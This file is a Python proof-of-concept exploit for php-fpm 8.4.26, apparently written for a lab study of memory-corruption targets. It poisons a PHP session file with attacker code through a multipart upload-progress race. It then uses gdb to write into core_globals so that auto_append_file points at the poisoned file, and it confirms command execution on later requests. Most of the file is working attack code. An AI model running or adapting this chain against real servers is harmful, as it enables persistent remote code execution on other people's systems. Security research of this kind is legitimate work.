#!/usr/bin/env python3
# INDEX: clean persistent auto_append dispatch via narrow write | fpm | gdb-calib
"""Install a CLEAN, worker-surviving persistent PG(auto_append_file) dispatch on
php-fpm 8.4.26 by depositing a 16-byte zval-shaped write whose adjacent-field type
pollution is benign.

Capability: write the 16-byte i:<int> zval shape -- [value(8)][IS_LONG=4(4)][u2=0(4)]
-- over a PG auto-include field, pointing it at a session-poisoned on-disk include so
the next request auto-includes it. Aimed at auto_append_file@0xa8, the IS_LONG(+8)
pollution lands on input_encoding@0xb0, which is NULL and never dereferenced on a
stock no-mbstring fpm -> a clean, surviving, persistent dispatch (vs auto_prepend@0xa0,
where IS_LONG lands on auto_append@0xa8 = (char*)4 -> the next request SIGSEGVs).

Geometry (struct _php_core_globals, 8.4.26-fpm, core_globals=0x16e1580):
    0xa0 auto_prepend_file   NULL   auto-included each request ([0] deref)
    0xa8 auto_append_file    NULL   auto-included each request ([0] deref)   <- target
    0xb0 input_encoding      NULL   never dereferenced (no mbstring)        <- IS_LONG
    0xc0 output_encoding     NULL   never dereferenced
    0xc8/0xd0 arg_separator  "&"    only in query-string build/parse
The full 3-value burst (k0@T, k1=0@T+16, k2@T+32) at T=0xa8 additionally lands
IS_LONG at output_encoding@0xc0 and writes arg_separator@0xc8/0xd0 -- all benign for
a plain request.

Constraints: this proves the clean-write TARGET GEOMETRY via a faithful 16-byte
zval-shape gdb deposit (value + IS_LONG@+8), not a clean 8-byte store. On fpm the php
binary .bss sits BELOW the request chunk, so a write that reaches core_globals does so
via a NEGATIVE slot index (no forward cap); landing the write end-to-end without gdb
needs per-image offset calibration.

Not a CVE: a target-geometry finding for the 16-byte zval write channel.

Tested: php-fpm 8.4.26 (pm=static). Requires the fpm lab up (profile cw) and a helper
module (imported from poc root) for session-poison / core_globals derivation / worker
helpers.
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import socket
import subprocess
import sys
import types

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)
from common import proc_gdb  # noqa: E402


def _load(name, filename):
    """Load a poc module as an isolated instance from poc/primitives/write/ or poc/."""
    for _d in (_HERE, _POC_ROOT):
        path = os.path.join(_d, filename)
        if os.path.exists(path):
            break
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules.setdefault(name, mod)
    spec.loader.exec_module(mod)
    return mod


# Building blocks: the fpm image geometry + worker helpers, the plain-GET success
# oracle, and the upload-progress race builders. Here only the WRITE TARGET
# (0xa8, not 0xa0) and the 16-byte deposit SHAPE differ.
race = _load("include_race", "routes/include_race.py")
oob_retrieve = _load("oob_output", "primitives/dispatch/oob_output.py")
_oracle = _load("auto_include_fire_oracle", "primitives/oracles/auto_include_fire_oracle.py")


def _dc(compose_file, *args, timeout=60, text=True):
    cmd = ["docker", "compose", "-f", compose_file, *args]
    return subprocess.run(cmd, capture_output=True, text=text, timeout=timeout)


def _exec(compose_file, service, *argv, timeout=60):
    return _dc(compose_file, "exec", "-T", service, *argv, timeout=timeout)


def poison(host, port, cmd, sid, save_path="/var/sess", parts=5000,
           base="/plain.php", oob_url=None, verbose=True):
    """Write attacker PHP into save_path/sess_<sid> via the upload-progress race.

    Uses upload_progress_include_race's own poison builders read-only. We do NOT
    use its include-read path (the target app has no includable param). Returns
    the on-disk path of the poisoned session file."""
    payload_cmd = cmd
    if oob_url:
        payload_cmd = oob_retrieve.wrap_command(cmd, oob_url)
    key = race.make_key(payload_cmd)
    body = race.build_storm_body(key, parts=parts)
    cookie = f"PHPSESSID={sid}"
    hdr = (f"POST {base} HTTP/1.1\r\nHost: {host}\r\n"
           f"Content-Type: multipart/form-data; boundary={race.BOUND}\r\n"
           f"Content-Length: {len(body)}\r\nCookie: {cookie}\r\n"
           f"Connection: close\r\n\r\n").encode()
    if verbose:
        print(f"[poison] storm {len(body)} B -> {base} (sid={sid}, {parts} parts)")
    try:
        with socket.create_connection((host, port), timeout=30) as s:
            s.sendall(hdr + body)
            race._recv_all(s, 15)
    except OSError as e:
        print(f"[poison] transport error: {e!r}")
    return f"{save_path.rstrip('/')}/sess_{sid}"


def read_sess_file(compose_file, service, sess_path):
    """Lab check: dump the poisoned session file to confirm the payload landed."""
    r = _exec(compose_file, service, "sh", "-c",
              f"cat {sess_path} 2>/dev/null | head -c 400")
    return r.stdout if r.returncode == 0 else None


G = types.SimpleNamespace(
    MARK_S=_oracle.MARK_S, MARK_E=_oracle.MARK_E,
    worker_pids=proc_gdb.worker_pids,
    derive_core_globals=proc_gdb.derive_core_globals,
    fpm_base_of=proc_gdb.fpm_base_of,
    confirm_rce=_oracle.confirm_rce, oracle_output=_oracle.oracle_output,
    poison=poison, read_sess_file=read_sess_file, _exec=_exec,
)

MARK_S, MARK_E = G.MARK_S, G.MARK_E

# php-fpm 8.4.26 _php_core_globals field offsets (within core_globals=0x16e1580).
CORE_GLOBALS = 0x16e1580
OFF_AUTO_PREPEND = 0xa0     # PG(auto_prepend_file)  -- IS_LONG(+8) hits auto_append (BAD)
OFF_AUTO_APPEND = 0xa8      # PG(auto_append_file)   -- IS_LONG(+8) hits input_encoding (OK)
OFF_INPUT_ENCODING = 0xb0   # NULL default, not dereferenced on stock no-mbstring fpm
OFF_OUTPUT_ENCODING = 0xc0  # burst k1-IS_LONG lands here; also benign
OFF_ARGSEP_OUTPUT = 0xc8    # burst k2 (value) lands here; benign for plain req
# scratch: zeroed/mapped tail of the last RW PT_LOAD, below the chunk (reachable).
PG_SCRATCH = 0x16e8b00
PG_SCRATCH_LIMIT = 0x16e9000


# shared gdb write fan-out base.
class _GdbFanOut:
    """Select worker pids (restrict= a subset, else every worker) and run a batch
    gdb `set` sequence against each, counting the writes. Shared by the 8-byte
    write8 and the 16-byte zval-shape deposit."""

    def __init__(self, compose_file, service, restrict=None, verbose=False):
        self.compose_file = compose_file
        self.service = service
        self.restrict = restrict
        self.verbose = verbose
        self.writes = 0

    def _pids(self):
        if self.restrict is not None:
            return list(self.restrict)
        return G.worker_pids(self.compose_file, self.service)

    def _run_gdb(self, pid, exprs, detach=False):
        argv = ["gdb", "-p", str(pid), "-batch", "-nx"]
        for e in exprs:
            argv += ["-ex", e]
        if detach:
            argv += ["-ex", "detach"]
        argv += ["-ex", "quit"]
        return G._exec(self.compose_file, self.service, *argv, timeout=60)


# clean 8-byte write8 backend.
class GdbWrite8(_GdbFanOut):
    """Clean 8-byte write8(abs_addr, qword) via in-container gdb, fanned out to
    EVERY worker pid (fpm memory is per-process, but fork-shared ASLR makes the
    absolute address identical on all workers). A gdb-assisted write for the
    mechanism proof -- it stands in for a CLEAN-write primitive (the 16-byte
    single-write primitive is not clean for this field).

    It can also target a SUBSET of pids (restrict=...) so the verifier can prove
    a single-worker install + a pinned oracle probe."""

    def write8(self, addr, qword):
        qword &= 0xFFFFFFFFFFFFFFFF
        pids = self._pids()
        for pid in pids:
            r = self._run_gdb(pid, [f"set {{unsigned long}}{addr:#x} = {qword:#x}"],
                              detach=True)
            if self.verbose and r.returncode != 0:
                print(f"[gdb] pid {pid} write {addr:#x} rc={r.returncode} "
                      f"{r.stderr.strip()[:120]}")
        self.writes += 1
        if self.verbose:
            print(f"[gdb] write8 {addr:#x} <- {qword:#016x} to {len(pids)} workers")
        return True


# 16-byte zval-shape deposit backend.
class ShapeWrite8(_GdbFanOut):
    """Deposit the 16-byte i:<int> zval-shaped write, fanned out to every worker
    (fork-shared ASLR -> identical absolute address on all workers).

    write8(addr, qword) deposits BOTH:
        *(unsigned long*)addr      = qword          (the value)
        *(unsigned long*)(addr+8)  = IS_LONG (0x4)   (the zval's u1.type_info/u2)
    i.e. the 16-byte pollution, not a clean 8-byte store: aimed at 0xa0 it reproduces
    the wall, aimed at 0xa8 it is harmless.

    burst=True additionally deposits the full 3-value burst (k0@T, k1=0@T+16,
    k2=k2val@T+32, each stamping IS_LONG at +8), exercising the full collateral
    footprint of one fire.

    The deposit is delivered via the lab's in-container gdb -- an analysis
    instrument for the shape proof; the clean-write geometry it proves is
    transport-independent.
    """

    IS_LONG = 0x4

    def __init__(self, compose_file, service, restrict=None, burst=False,
                 k2val=0, verbose=False):
        super().__init__(compose_file, service, restrict=restrict, verbose=verbose)
        self.burst = burst
        self.k2val = k2val

    def _gdb(self, pid, exprs):
        return self._run_gdb(pid, exprs)

    def write8(self, addr, qword):
        """Deposit the 16-byte shape: `qword` at `addr` (+ IS_LONG at addr+8)."""
        qword &= 0xFFFFFFFFFFFFFFFF
        for pid in self._pids():
            exprs = [f"set {{unsigned long}}{addr:#x} = {qword:#x}",
                     f"set {{unsigned long}}{addr + 8:#x} = {self.IS_LONG:#x}"]
            if self.burst:
                exprs += [
                    f"set {{unsigned long}}{addr + 16:#x} = 0",
                    f"set {{unsigned long}}{addr + 24:#x} = {self.IS_LONG:#x}",
                    f"set {{unsigned long}}{addr + 32:#x} = {self.k2val:#x}",
                    f"set {{unsigned long}}{addr + 40:#x} = {self.IS_LONG:#x}",
                ]
            self._gdb(pid, exprs)
        self.writes += 1
        if self.verbose:
            print(f"[fpm_clean_pg_write] write8 {addr:#x} <- {qword:#016x} "
                  f"(+IS_LONG@+8{'; burst' if self.burst else ''})")
        return True


def write_cstring_scratch(compose_file, service, pids, scratch_abs, s):
    """Lay the NUL-terminated path `s` into the .bss scratch slack on every
    worker, via gdb memcpy (analysis instrument). Returns scratch_abs."""
    raw = s if isinstance(s, (bytes, bytearray)) else s.encode()
    # Escape for the gdb string literal; the arg must carry no embedded NUL, so
    # memcpy the path bytes only and set the NUL terminator with a separate set.
    lit = bytes(raw).decode("latin-1").replace("\\", "\\\\").replace('"', '\\"')
    for pid in pids:
        G._exec(compose_file, service, "gdb", "-p", str(pid), "-batch", "-nx",
                "-ex", f'call (void)memcpy({scratch_abs:#x}, "{lit}", {len(raw)})',
                "-ex", f"set {{unsigned char}}{scratch_abs + len(raw):#x} = 0",
                "-ex", "quit", timeout=60)
    return scratch_abs


# The clean install: auto_append_file@0xa8.
def install_clean_autoappend(base_addr, cg_off, w8, pids, compose_file, service,
                             include_path, scratch_off=PG_SCRATCH):
    """Install a persistent PG(auto_append_file) dispatch with a CLEAN 16-byte
    zval-shape write: lay `include_path` in .bss scratch, then deposit the scratch
    pointer at auto_append_file@+0xa8. The IS_LONG(+8) pollution lands on
    input_encoding@+0xb0 (benign). Returns (target_addr, str_addr)."""
    scratch_abs = base_addr + scratch_off
    write_cstring_scratch(compose_file, service, pids, scratch_abs, include_path)
    target = base_addr + cg_off + OFF_AUTO_APPEND
    w8.write8(target, scratch_abs)
    return target, scratch_abs


def install_dirty_autoprepend(base_addr, cg_off, w8, pids, compose_file, service,
                              include_path, scratch_off=PG_SCRATCH):
    """The wall case: the SAME 16-byte zval-shape deposit aimed at
    auto_prepend_file@+0xa0, where the IS_LONG(+8) pollution lands on
    auto_append_file@+0xa8 -> (char*)4 -> the next request SIGSEGVs. Returns
    (target_addr, str_addr). Used by the verifier for the A/B contrast."""
    scratch_abs = base_addr + scratch_off
    write_cstring_scratch(compose_file, service, pids, scratch_abs, include_path)
    target = base_addr + cg_off + OFF_AUTO_PREPEND
    w8.write8(target, scratch_abs)
    return target, scratch_abs


def read_pg_fields(compose_file, service, pid, cg_abs):
    """Dump the PG fields 0xa0..0xd0 on one worker (lab inspection)."""
    exprs = []
    for off in (0xa0, 0xa8, 0xb0, 0xb8, 0xc0, 0xc8, 0xd0):
        exprs.append(f'printf "0x{off:x}=%#lx\\n", '
                     f'*(unsigned long*){cg_abs + off:#x}')
    r = G._exec(compose_file, service, "gdb", "-p", str(pid), "-batch", "-nx",
                *sum([["-ex", e] for e in exprs], []), "-ex", "quit", timeout=60)
    out = {}
    for line in (r.stdout + r.stderr).splitlines():
        line = line.strip()
        if line.startswith("0x") and "=" in line:
            k, v = line.split("=", 1)
            try:
                out[k] = int(v, 16)
            except ValueError:
                pass
    return out


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="clean var_hash_rw-shape PG(auto_append_file) install on php-fpm")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8151)
    ap.add_argument("--compose-file",
                    default=os.path.join(os.path.dirname(_POC_ROOT),
                                         "docker-compose.fpm-avenues.yml"))
    ap.add_argument("--service", default="cw-fpm")
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--base", default="/plain.php")
    ap.add_argument("--sid", default="0123456789abcdef0123456789abcdef")
    ap.add_argument("--save-path", default="/var/sess")
    ap.add_argument("--parts", type=int, default=3000)
    ap.add_argument("--burst", action="store_true",
                    help="reproduce the full var_hash_rw 3-value burst collateral")
    ap.add_argument("--target", choices=["append", "prepend"], default="append",
                    help="append=clean (0xa8); prepend=grail wall (0xa0)")
    a = ap.parse_args(argv)

    # grouped-compose isolation for the imported helper module (G).
    os.environ["COMPOSE_FILE"] = a.compose_file
    os.environ["COMPOSE_PROJECT_NAME"] = "p2s-cw"
    os.environ["COMPOSE_PROFILES"] = "cw"

    cf, svc = a.compose_file, a.service
    cg, how = G.derive_core_globals(cf, svc)
    cg = cg or CORE_GLOBALS
    pids = G.worker_pids(cf, svc)
    base = G.fpm_base_of(cf, svc, pids[0]) if pids else None
    if not pids or base is None:
        print("[clean-write] no workers / no base; is the lab up?")
        return 2
    print(f"[clean-write] core_globals={cg:#x} base={base:#x} "
          f"PG(auto_append)={base + cg + OFF_AUTO_APPEND:#x}")

    # session-poison the on-disk include (app-free, socket-free) via the helper.
    sess_path = G.poison(a.host, a.port, a.cmd, a.sid, save_path=a.save_path,
                         parts=a.parts, base=a.base, verbose=True)
    disk = G.read_sess_file(cf, svc, sess_path)
    print(f"[clean-write] poison on disk: {bool(disk and MARK_S in (disk or ''))}"
          f" ({sess_path})")

    w8 = ShapeWrite8(cf, svc, burst=a.burst, verbose=True)
    if a.target == "append":
        tgt, sa = install_clean_autoappend(base, cg, w8, pids, cf, svc, sess_path)
        print(f"[clean-write] CLEAN install: PG(auto_append_file)@{tgt:#x} -> "
              f"{sa:#x}; var_hash_rw IS_LONG pollution -> input_encoding@+0xb0 (benign)")
    else:
        tgt, sa = install_dirty_autoprepend(base, cg, w8, pids, cf, svc, sess_path)
        print(f"[clean-write] WALL install: PG(auto_prepend_file)@{tgt:#x} -> "
              f"{sa:#x}; var_hash_rw IS_LONG pollution -> auto_append@+0xa8 = (char*)4")

    ok, out, probes = G.confirm_rce(a.host, a.port, base=a.base, sid=a.sid,
                                    tries=8, verbose=True)
    print(f"[clean-write] fired={ok} probes={probes} output={out!r}")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
